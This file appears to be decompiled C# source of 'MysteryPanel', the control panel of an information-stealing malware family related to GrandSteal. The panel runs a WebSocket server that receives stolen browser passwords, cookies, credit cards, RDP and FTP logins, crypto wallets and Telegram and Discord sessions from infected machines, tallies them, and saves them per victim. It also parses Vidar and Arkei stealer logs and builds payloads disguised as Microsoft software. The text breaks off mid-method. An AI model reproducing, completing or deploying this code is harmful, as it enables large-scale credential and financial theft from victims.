using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reactive;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DynamicData;
using GrandSteal.Server.Data;
using GrandSteal.Server.Data.Extensions;
using GrandSteal.Server.Data.Extensions.Collection;
using GrandSteal.Server.Data.Extensions.Nulls;
using GrandSteal.Server.Data.Repository;
using GrandSteal.Server.Data.Server;
using GrandSteal.Server.Models;
using GrandSteal.SharedModels;
using GrandSteal.SharedModels.Communication;
using GrandSteal.SharedModels.Models;
using LogManager.Core.Data;
using LogManager.Core.DerivedClasses.Arkei;
using LogManager.Core.DerivedClasses.GrandSteal;
using LogManager.Core.DerivedClasses.NewUri;
using LogManager.Core.DerivedClasses.OldUri;
using LogManager.Core.DerivedClasses.Stealer;
using LogManager.Core.DerivedClasses.Vidar;
using LogManager.Core.Domain;
using MetroSet_UI.Design;
using ReactiveUI;
using SuperSocket.SocketBase;
using SuperSocket.WebSocket;

namespace MysteryPanel.ViewModels
{
	// Token: 0x02000010 RID: 16
	public class PanelViewModel : SchedulerResolver
	{
		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000CE RID: 206 RVA: 0x00002A54 File Offset: 0x00000C54
		// (set) Token: 0x060000CF RID: 207 RVA: 0x00002A5C File Offset: 0x00000C5C
		public LogsViewModel LogsVM
		{
			[CompilerGenerated]
			get
			{
				return this.<LogsVM>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<LogsVM>k__BackingField, value))
				{
					return;
				}
				this.<LogsVM>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.LogsVM);
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000D0 RID: 208 RVA: 0x00002A81 File Offset: 0x00000C81
		// (set) Token: 0x060000D1 RID: 209 RVA: 0x00002A89 File Offset: 0x00000C89
		public ServerWCF ServerWCF
		{
			[CompilerGenerated]
			get
			{
				return this.<ServerWCF>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<ServerWCF>k__BackingField, value))
				{
					return;
				}
				this.<ServerWCF>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.ServerWCF);
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x060000D2 RID: 210 RVA: 0x00002AAE File Offset: 0x00000CAE
		// (set) Token: 0x060000D3 RID: 211 RVA: 0x00002AB6 File Offset: 0x00000CB6
		public UserAccount Account
		{
			[CompilerGenerated]
			get
			{
				return this.<Account>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<Account>k__BackingField, value))
				{
					return;
				}
				this.<Account>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.Account);
			}
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x060000D4 RID: 212 RVA: 0x00002ADB File Offset: 0x00000CDB
		// (set) Token: 0x060000D5 RID: 213 RVA: 0x00002AE3 File Offset: 0x00000CE3
		public ServerManager ServerManager
		{
			[CompilerGenerated]
			get
			{
				return this.<ServerManager>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<ServerManager>k__BackingField, value))
				{
					return;
				}
				this.<ServerManager>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.ServerManager);
			}
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x060000D6 RID: 214 RVA: 0x00002B08 File Offset: 0x00000D08
		// (set) Token: 0x060000D7 RID: 215 RVA: 0x00002B10 File Offset: 0x00000D10
		public ClientSettings ClientSettings
		{
			[CompilerGenerated]
			get
			{
				return this.<ClientSettings>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<ClientSettings>k__BackingField, value))
				{
					return;
				}
				this.<ClientSettings>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.ClientSettings);
			}
		}

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x060000D8 RID: 216 RVA: 0x00002B35 File Offset: 0x00000D35
		// (set) Token: 0x060000D9 RID: 217 RVA: 0x00002B3D File Offset: 0x00000D3D
		public CompilationSettings CompilationSettings
		{
			[CompilerGenerated]
			get
			{
				return this.<CompilationSettings>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CompilationSettings>k__BackingField, value))
				{
					return;
				}
				this.<CompilationSettings>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CompilationSettings);
			}
		}

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x060000DA RID: 218 RVA: 0x00002B62 File Offset: 0x00000D62
		// (set) Token: 0x060000DB RID: 219 RVA: 0x00002B6A File Offset: 0x00000D6A
		public Style CurrentThemeStyle
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentThemeStyle>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (this.<CurrentThemeStyle>k__BackingField == value)
				{
					return;
				}
				this.<CurrentThemeStyle>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentThemeStyle);
			}
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060000DC RID: 220 RVA: 0x00002B8C File Offset: 0x00000D8C
		// (set) Token: 0x060000DD RID: 221 RVA: 0x00002B94 File Offset: 0x00000D94
		public BindingList<string> ServerLogs
		{
			[CompilerGenerated]
			get
			{
				return this.<ServerLogs>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<ServerLogs>k__BackingField, value))
				{
					return;
				}
				this.<ServerLogs>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.ServerLogs);
			}
		}

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060000DE RID: 222 RVA: 0x00002BB9 File Offset: 0x00000DB9
		// (set) Token: 0x060000DF RID: 223 RVA: 0x00002BC1 File Offset: 0x00000DC1
		public BindingList<string> CurrentPaths
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentPaths>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CurrentPaths>k__BackingField, value))
				{
					return;
				}
				this.<CurrentPaths>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentPaths);
			}
		}

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x060000E0 RID: 224 RVA: 0x00002BE6 File Offset: 0x00000DE6
		// (set) Token: 0x060000E1 RID: 225 RVA: 0x00002BEE File Offset: 0x00000DEE
		public BindingList<string> Domains
		{
			[CompilerGenerated]
			get
			{
				return this.<Domains>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<Domains>k__BackingField, value))
				{
					return;
				}
				this.<Domains>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.Domains);
			}
		}

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x060000E2 RID: 226 RVA: 0x00002C13 File Offset: 0x00000E13
		// (set) Token: 0x060000E3 RID: 227 RVA: 0x00002C1B File Offset: 0x00000E1B
		public List<string> DomainsFiltered
		{
			[CompilerGenerated]
			get
			{
				return this.<DomainsFiltered>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<DomainsFiltered>k__BackingField, value))
				{
					return;
				}
				this.<DomainsFiltered>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.DomainsFiltered);
			}
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x060000E4 RID: 228 RVA: 0x00002C40 File Offset: 0x00000E40
		// (set) Token: 0x060000E5 RID: 229 RVA: 0x00002C48 File Offset: 0x00000E48
		public List<string> DomainsAll
		{
			[CompilerGenerated]
			get
			{
				return this.<DomainsAll>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<DomainsAll>k__BackingField, value))
				{
					return;
				}
				this.<DomainsAll>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.DomainsAll);
			}
		}

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x060000E6 RID: 230 RVA: 0x00002C6D File Offset: 0x00000E6D
		// (set) Token: 0x060000E7 RID: 231 RVA: 0x00002C75 File Offset: 0x00000E75
		public bool ShowingPaths
		{
			[CompilerGenerated]
			get
			{
				return this.<ShowingPaths>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (this.<ShowingPaths>k__BackingField == value)
				{
					return;
				}
				this.<ShowingPaths>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.ShowingPaths);
			}
		}

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x060000E8 RID: 232 RVA: 0x00002C97 File Offset: 0x00000E97
		// (set) Token: 0x060000E9 RID: 233 RVA: 0x00002C9F File Offset: 0x00000E9F
		public string PanelVersion
		{
			[CompilerGenerated]
			get
			{
				return this.<PanelVersion>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<PanelVersion>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<PanelVersion>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.PanelVersion);
			}
		}

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x060000EA RID: 234 RVA: 0x00002CC5 File Offset: 0x00000EC5
		// (set) Token: 0x060000EB RID: 235 RVA: 0x00002CCD File Offset: 0x00000ECD
		public string CurrentDesktopExt
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentDesktopExt>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<CurrentDesktopExt>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<CurrentDesktopExt>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentDesktopExt);
			}
		}

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x060000EC RID: 236 RVA: 0x00002CF3 File Offset: 0x00000EF3
		// (set) Token: 0x060000ED RID: 237 RVA: 0x00002CFB File Offset: 0x00000EFB
		public IObservable<bool> CanOpenLogs
		{
			[CompilerGenerated]
			get
			{
				return this.<CanOpenLogs>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CanOpenLogs>k__BackingField, value))
				{
					return;
				}
				this.<CanOpenLogs>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CanOpenLogs);
			}
		}

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x060000EE RID: 238 RVA: 0x00002D20 File Offset: 0x00000F20
		// (set) Token: 0x060000EF RID: 239 RVA: 0x00002D28 File Offset: 0x00000F28
		public IObservable<bool> CanBuild
		{
			[CompilerGenerated]
			get
			{
				return this.<CanBuild>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CanBuild>k__BackingField, value))
				{
					return;
				}
				this.<CanBuild>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CanBuild);
			}
		}

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x060000F0 RID: 240 RVA: 0x00002D4D File Offset: 0x00000F4D
		// (set) Token: 0x060000F1 RID: 241 RVA: 0x00002D55 File Offset: 0x00000F55
		public IObservable<bool> CanOpenIcon
		{
			[CompilerGenerated]
			get
			{
				return this.<CanOpenIcon>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CanOpenIcon>k__BackingField, value))
				{
					return;
				}
				this.<CanOpenIcon>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CanOpenIcon);
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x060000F2 RID: 242 RVA: 0x00002D7A File Offset: 0x00000F7A
		// (set) Token: 0x060000F3 RID: 243 RVA: 0x00002D82 File Offset: 0x00000F82
		public WindowsFormsSynchronizationContext Synchronization
		{
			[CompilerGenerated]
			get
			{
				return this.<Synchronization>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<Synchronization>k__BackingField, value))
				{
					return;
				}
				this.<Synchronization>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.Synchronization);
			}
		}

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x060000F4 RID: 244 RVA: 0x00002DA7 File Offset: 0x00000FA7
		// (set) Token: 0x060000F5 RID: 245 RVA: 0x00002DAF File Offset: 0x00000FAF
		public bool IsLogsLoading
		{
			[CompilerGenerated]
			get
			{
				return this.<IsLogsLoading>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (this.<IsLogsLoading>k__BackingField == value)
				{
					return;
				}
				this.<IsLogsLoading>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.IsLogsLoading);
			}
		}

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x060000F6 RID: 246 RVA: 0x00002DD1 File Offset: 0x00000FD1
		// (set) Token: 0x060000F7 RID: 247 RVA: 0x00002DD9 File Offset: 0x00000FD9
		public bool IsAvaliableLogs
		{
			[CompilerGenerated]
			get
			{
				return this.<IsAvaliableLogs>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (this.<IsAvaliableLogs>k__BackingField == value)
				{
					return;
				}
				this.<IsAvaliableLogs>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.IsAvaliableLogs);
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x060000F8 RID: 248 RVA: 0x00002DFB File Offset: 0x00000FFB
		// (set) Token: 0x060000F9 RID: 249 RVA: 0x00002E03 File Offset: 0x00001003
		public bool IsAvaliableChangeSettings
		{
			[CompilerGenerated]
			get
			{
				return this.<IsAvaliableChangeSettings>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (this.<IsAvaliableChangeSettings>k__BackingField == value)
				{
					return;
				}
				this.<IsAvaliableChangeSettings>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.IsAvaliableChangeSettings);
			}
		}

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x060000FA RID: 250 RVA: 0x00002E25 File Offset: 0x00001025
		// (set) Token: 0x060000FB RID: 251 RVA: 0x00002E2D File Offset: 0x0000102D
		public string CurrentLogDirectory
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentLogDirectory>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<CurrentLogDirectory>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<CurrentLogDirectory>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentLogDirectory);
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x060000FC RID: 252 RVA: 0x00002E53 File Offset: 0x00001053
		// (set) Token: 0x060000FD RID: 253 RVA: 0x00002E5B File Offset: 0x0000105B
		public string CurrentIconPath
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentIconPath>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<CurrentIconPath>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<CurrentIconPath>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentIconPath);
			}
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x060000FE RID: 254 RVA: 0x00002E81 File Offset: 0x00001081
		// (set) Token: 0x060000FF RID: 255 RVA: 0x00002E89 File Offset: 0x00001089
		public string CurrentAccountFormatter
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentAccountFormatter>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<CurrentAccountFormatter>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<CurrentAccountFormatter>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentAccountFormatter);
			}
		}

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000100 RID: 256 RVA: 0x00002EAF File Offset: 0x000010AF
		// (set) Token: 0x06000101 RID: 257 RVA: 0x00002EB7 File Offset: 0x000010B7
		public string CurrentDomainFilter
		{
			[CompilerGenerated]
			get
			{
				return this.<CurrentDomainFilter>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (string.Equals(this.<CurrentDomainFilter>k__BackingField, value, StringComparison.Ordinal))
				{
					return;
				}
				this.<CurrentDomainFilter>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CurrentDomainFilter);
			}
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00004408 File Offset: 0x00002608
		public PanelViewModel(IScheduler scheduler)
		{
			this.<CurrentAccountFormatter>k__BackingField = "{Login};{Password} | Parsed in {HWID} from {Browser}";
			this.<CurrentDomainFilter>k__BackingField = "";
			base..ctor(scheduler);
			this._predicateFactory = PredicateFactory<string, AbstractLogProfile>.Create();
			this._predicateFactory.Predicates.Add(new StealerLogProfile(), delegate(string x)
			{
				string[] array = new DirectoryInfo(x).Name.Split(new string[]
				{
					"_"
				}, StringSplitOptions.RemoveEmptyEntries);
				return array.Length > 1 && (array[0].Length == 32 && !array[1].Contains("[")) && !array[1].Contains("]");
			});
			this._predicateFactory.Predicates.Add(new OldUriLogProfile(), (string x) => new DirectoryInfo(x).Name.Length == 32);
			this._predicateFactory.Predicates.Add(new NewUriLogProfile(), delegate(string x)
			{
				string[] array = new DirectoryInfo(x).Name.Split(new string[]
				{
					"_"
				}, StringSplitOptions.RemoveEmptyEntries);
				return array.Length > 1 && (array[0].Length == 32 && array[1].Contains("[")) && array[1].Contains("]");
			});
			this._predicateFactory.Predicates.Add(new VidarLogProfile(), delegate(string x)
			{
				long num;
				return long.TryParse(new DirectoryInfo(x).Name, out num);
			});
			this._predicateFactory.Predicates.Add(new ArkeiLogProfile(), delegate(string x)
			{
				string[] array = new DirectoryInfo(x).Name.Split(new string[]
				{
					"_"
				}, StringSplitOptions.None);
				return array.Length > 1 && array[1].Split(new char[]
				{
					'-'
				}).Length == 5;
			});
			this._predicateFactory.Predicates.Add(new GrandStealLogProfile(), delegate(string x)
			{
				string[] array = new DirectoryInfo(x).Name.Split(new string[]
				{
					" "
				}, StringSplitOptions.None);
				return array.Length == 2 && (array[0].Contains("[") && array[0].Contains("]") && array[1].Contains("[")) && array[1].Contains("]");
			});
			this.Synchronization = (SynchronizationContext.Current as WindowsFormsSynchronizationContext);
			this.ServerManager = new ServerManager(this.CreateHandlers());
			this.LogsVM = new LogsViewModel(base.Scheduler);
			LogsViewModel logsVM = this.LogsVM;
			logsVM.OnSystemLog = (SystemMessageHandler)Delegate.Combine(logsVM.OnSystemLog, new SystemMessageHandler(this.OnSystemLogInvoked));
			this.CanOpenLogs = this.WhenAnyValue((PanelViewModel view) => view.IsLogsLoading, (bool isLoading) => !isLoading).DistinctUntilChanged<bool>();
			this.CanOpenIcon = this.WhenAnyValue((PanelViewModel view) => view.IsAvaliableChangeSettings, (bool isLoading) => isLoading).DistinctUntilChanged<bool>();
			this.CanBuild = this.WhenAnyValue((PanelViewModel view) => view.IsAvaliableChangeSettings, (PanelViewModel view) => view.CompilationSettings.PanelAdress, (bool isLoading, string adress) => isLoading && !string.IsNullOrWhiteSpace(adress)).DistinctUntilChanged<bool>();
			this.ConvertToNetscapeCommand = ReactiveCommand.CreateFromTask(new Func<Task>(this.ConvertToNetscape), null, null);
			this.ConvertToJsonCommand = ReactiveCommand.CreateFromTask(new Func<Task>(this.ConvertToJson), null, null);
			this.SaveDomainsCommand = ReactiveCommand.CreateFromTask<string>(new Func<string, Task>(this.SaveDomains), null, null);
			this.AddNewExtCommand = ReactiveCommand.Create(new Action(this.AddNewExt), null, null);
			this.OpenLogsFolderCommand = ReactiveCommand.CreateFromTask(new Func<Task>(this.OpenLogsFolder), this.CanOpenLogs, null);
			this.OpenIconCommand = ReactiveCommand.CreateFromTask(new Func<Task>(this.OpenIcon), this.CanOpenIcon, null);
			this.CreateBuildCommand = ReactiveCommand.Create(new Action(this.CreateBuild), this.CanBuild, null);
			this.FilterDomainsCommand = ReactiveCommand.CreateFromTask(new Func<Task>(this.FilterDomains), null, null);
			this.PanelVersion = "1.1";
			this.CurrentThemeStyle = Style.Dark;
			this.ClientSettings = new ClientSettings(false);
			this.CurrentPaths = new BindingList<string>
			{
				AllowEdit = true,
				AllowNew = true,
				AllowRemove = true,
				RaiseListChangedEvents = true
			};
			this.ServerLogs = new BindingList<string>
			{
				AllowEdit = true,
				AllowNew = true,
				AllowRemove = true,
				RaiseListChangedEvents = true
			};
			this.Domains = new BindingList<string>
			{
				AllowEdit = true,
				AllowNew = true,
				AllowRemove = true,
				RaiseListChangedEvents = true
			};
			this.ServerWCF = new ServerWCF();
			this.Account = new UserAccount();
			this.CompilationSettings = new CompilationSettings();
			this.CompilationSettings.OutputCompany = "Microsoft";
			this.CompilationSettings.OutputCopyright = "Microsoft © 2019";
			this.CompilationSettings.OutputDescription = "Microsoft Application";
			this.CompilationSettings.OutputPlatform = "v2.0";
			this.CompilationSettings.OutputVersion = "1.0.0.0";
			this.CompilationSettings.SourceID = "MysteryPanel";
			this.CompilationSettings.PanelAdress = "192.168.0.108";
			this.CloseApplicationCommand = ReactiveCommand.Create<CancelEventArgs>(delegate(CancelEventArgs _)
			{
				Environment.Exit(0);
			}, null, null);
			this.WhenAnyValue((PanelViewModel x) => x.ServerManager.Running).Subscribe(delegate(bool running)
			{
				if (running)
				{
					this.OnSystemLogInvoked("ServerManager", "Server is running. Host: " + this.ServerManager.Host + ":2012");
					return;
				}
				this.OnSystemLogInvoked("ServerManager", "Server isn't running");
			});
			this.WhenAnyValue((PanelViewModel view) => view.CurrentDomainFilter).Subscribe(delegate(string x)
			{
				if (!string.IsNullOrWhiteSpace(x))
				{
					this.FilterDomainsCommand.Execute(default(Unit));
				}
			});
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00004A54 File Offset: 0x00002C54
		public override async void Load()
		{
			this.IsAvaliableChangeSettings = true;
			this.ClientSettings.Load();
			this.LogsVM.Load();
			base.OwnerControl.Control.Visible = true;
			await this.ServerManager.StartAsync().ConfigureAwait(false);
			this.OnSystemLogInvoked("PanelViewModel", "Loaded");
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00004A90 File Offset: 0x00002C90
		public Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocketSession>> CreateHandlers()
		{
			Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocketSession>> dictionary = new Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocketSession>>();
			Func<RequestBase, bool> key = (RequestBase message) => message.Name == "Credentials";
			dictionary[key] = new Action<RequestBase, WebSocketSession>(this.CredentialRequest);
			Func<RequestBase, bool> key2 = (RequestBase message) => message.Name == "ParseClientSettings";
			dictionary[key2] = new Action<RequestBase, WebSocketSession>(this.ParseClientSettingsRequest);
			return dictionary;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00004B08 File Offset: 0x00002D08
		public async void CredentialRequest(RequestBase message, WebSocketSession session)
		{
			try
			{
				Request<CredentialsRequest> value = message as Request<CredentialsRequest>;
				CredentialsRequest request = value.IsNull(new Request<CredentialsRequest>()).Body;
				request.ClientInformation = request.ClientInformation.IsNull(new RemoteClientInformation
				{
					ClientIP = "UNKNOWN",
					Country = "UNKNOWN",
					HardwareID = "UNKNOWN",
					OperationSystem = "UNKNOWN",
					SourceID = "UNKNOWN",
					UserName = "UNKNOWN"
				});
				request.ClientInformation.LogTime = DateTime.Now;
				request.BrowserProfiles = request.BrowserProfiles.IsNull(new List<BrowserProfile>());
				request.RdpConnections = request.RdpConnections.IsNull(new List<RdpCredential>());
				request.ColdWallets = request.ColdWallets.IsNull(new List<ColdWallet>());
				request.DesktopFiles = request.DesktopFiles.IsNull(new List<DesktopFile>());
				request.FtpCredentials = request.FtpCredentials.IsNull(new List<FtpCredential>());
				request.Telegram = request.Telegram.IsNull(new TelegramSession());
				request.Discord = request.Discord.IsNull(new DiscordSession());
				request.ClientInformation.Antiviruses = request.ClientInformation.Antiviruses.IsNull(new List<string>());
				request.ClientInformation.Languages = request.ClientInformation.Languages.IsNull(new List<string>());
				request.ClientInformation.CurrentLanguage = request.ClientInformation.CurrentLanguage.IsNull("UNKNOWN");
				request.ClientInformation.City = request.ClientInformation.City.IsNull("UNKNOWN");
				request.ClientInformation.MonitorSize = request.ClientInformation.MonitorSize.IsNull("UNKNOWN");
				request.ClientInformation.TimeZone = request.ClientInformation.TimeZone.IsNull("UNKNOWN");
				request.ProcessList = request.ProcessList.IsNull(new List<RemoteProcess>());
				request.InstalledPrograms = request.InstalledPrograms.IsNull(new List<string>());
				object obj = this.countLock;
				lock (obj)
				{
					this.LogsVM.StorageOfCounters.SaveInChange = false;
					using (List<BrowserProfile>.Enumerator enumerator = request.BrowserProfiles.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							BrowserProfile profile = enumerator.Current;
							WindowsFormsSynchronizationContext synchronization = this.Synchronization;
							if (synchronization != null)
							{
								synchronization.Send(delegate(object _)
								{
									this.LogsVM.StorageOfCounters.TotalAccounts += profile.BrowserCredendtials.Count;
									this.LogsVM.StorageOfCounters.TotalCookies += profile.BrowserCookies.Count;
									this.LogsVM.StorageOfCounters.TotalCreditCards += profile.BrowserCreditCards.Count;
								}, profile);
							}
						}
					}
					WindowsFormsSynchronizationContext synchronization2 = this.Synchronization;
					if (synchronization2 != null)
					{
						synchronization2.Send(delegate(object _)
						{
							this.LogsVM.StorageOfCounters.TotalCryptoWallets += request.ColdWallets.Count;
							this.LogsVM.StorageOfCounters.TotalFtps += request.FtpCredentials.Count;
							this.LogsVM.StorageOfCounters.TotalWinStoreCreds += request.RdpConnections.Count;
							CounterStorage storageOfCounters = this.LogsVM.StorageOfCounters;
							storageOfCounters.TotalRDP += request.RdpConnections.Count((RdpCredential x) => x.Target.Contains("TERMSRV"));
							this.LogsVM.StorageOfCounters.TotalDesktopFiles += request.DesktopFiles.Count;
							if (request.Telegram.MapFile != null && request.Telegram.RootFile != null)
							{
								CounterStorage storageOfCounters2 = this.LogsVM.StorageOfCounters;
								int num = storageOfCounters2.TotalTelegram;
								storageOfCounters2.TotalTelegram = num + 1;
							}
							if (request.Discord.token != null && request.Discord.events != null && request.Discord != null)
							{
								CounterStorage storageOfCounters3 = this.LogsVM.StorageOfCounters;
								int num = storageOfCounters3.TotalDiscord;
								storageOfCounters3.TotalDiscord = num + 1;
							}
						}, null);
					}
					this.LogsVM.StorageOfCounters.SaveInChange = true;
					this.LogsVM.StorageOfCounters.Save();
				}
				if ((request.Discord.token != null && request.Discord.events != null && request.Discord != null) || (request.Telegram.MapFile != null && request.Telegram.RootFile != null) || request.BrowserProfiles.Count != 0 || request.ColdWallets.Count != 0 || request.FtpCredentials.Count != 0 || request.RdpConnections.Count != 0 || request.DesktopFiles.Count != 0)
				{
					this.OnSystemLogInvoked("ServerManager", "Recieved log from " + request.ClientInformation.HardwareID + " | " + request.ClientInformation.ClientIP);
					this.LogsVM.Logs.Add(request.ClientInformation);
					await Task.Factory.StartNew(delegate()
					{
						CredentialsRequest request;
						request.SaveTo(Path.Combine(Directory.GetCurrentDirectory(), "Results"));
						string text = Path.Combine(Directory.GetCurrentDirectory(), "Results", string.Concat(new string[]
						{
							"[",
							request.ClientInformation.HardwareID,
							"] [",
							request.ClientInformation.UserName,
							"]"
						}));
						if (Directory.Exists(text))
						{
							this.LogsVM.PathsToLogs.SusspendNotifies(false);
							request = request;
							bool flag2;
							if (request == null)
							{
								flag2 = false;
							}
							else
							{
								List<RdpCredential> rdpConnections = request.RdpConnections;
								int? num;
								if (rdpConnections == null)
								{
									num = null;
								}
								else
								{
									num = new int?(rdpConnections.Count((RdpCredential x) => x.Target.Contains("TERMSRV")));
								}
								int? num2 = num;
								int num3 = 0;
								flag2 = (num2.GetValueOrDefault() > num3 & num2 != null);
							}
							if (flag2 && !this.LogsVM.PathsToLogs.ClientsWithRDP.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithRDP.Add(text);
							}
							CredentialsRequest request2 = request;
							bool flag3;
							if (request2 == null)
							{
								flag3 = false;
							}
							else
							{
								List<FtpCredential> ftpCredentials = request2.FtpCredentials;
								int? num2 = (ftpCredentials != null) ? new int?(ftpCredentials.Count) : null;
								int num3 = 0;
								flag3 = (num2.GetValueOrDefault() > num3 & num2 != null);
							}
							if (flag3 && !this.LogsVM.PathsToLogs.ClientsWithFTP.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithFTP.Add(text);
							}
							CredentialsRequest request3 = request;
							bool flag4;
							if (request3 == null)
							{
								flag4 = false;
							}
							else
							{
								List<ColdWallet> coldWallets = request3.ColdWallets;
								int? num2 = (coldWallets != null) ? new int?(coldWallets.Count) : null;
								int num3 = 0;
								flag4 = (num2.GetValueOrDefault() > num3 & num2 != null);
							}
							if (flag4 && !this.LogsVM.PathsToLogs.ClientsWithCrypto.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithCrypto.Add(text);
							}
							CredentialsRequest request4 = request;
							bool flag5;
							if (request4 == null)
							{
								flag5 = (null != null);
							}
							else
							{
								TelegramSession telegram = request4.Telegram;
								flag5 = (((telegram != null) ? telegram.MapFile : null) != null);
							}
							if (flag5 && request.Telegram.RootFile != null && !this.LogsVM.PathsToLogs.ClientsWithTelegram.Contains(text))
							{
								this.LogsVM.PathsToLogs.ClientsWithTelegram.Add(text);
							}
							CredentialsRequest request5 = request;
